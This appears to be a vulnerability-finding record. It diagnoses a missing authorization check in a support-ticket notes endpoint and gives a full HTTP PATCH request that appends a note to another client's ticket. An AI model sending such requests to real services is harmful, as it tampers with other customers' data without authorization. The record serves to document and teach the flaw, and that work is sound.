diagnosis: The ticket note endpoint retrieves support tickets by ID using findById() and appends client notes without verifying that the authenticated user is either the original ticket author or an assigned support agent. Customers can append unauthorized communication to support tickets belonging to other client organizations.
exploit_request:
PATCH /api/support/tickets/59102/notes HTTP/1.1
Host: support.saasservice.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjdXN0Xzc3MTQifQ.tok
Content-Type: application/json

{"noteContent": "Client requested priority escalation to critical severity"}
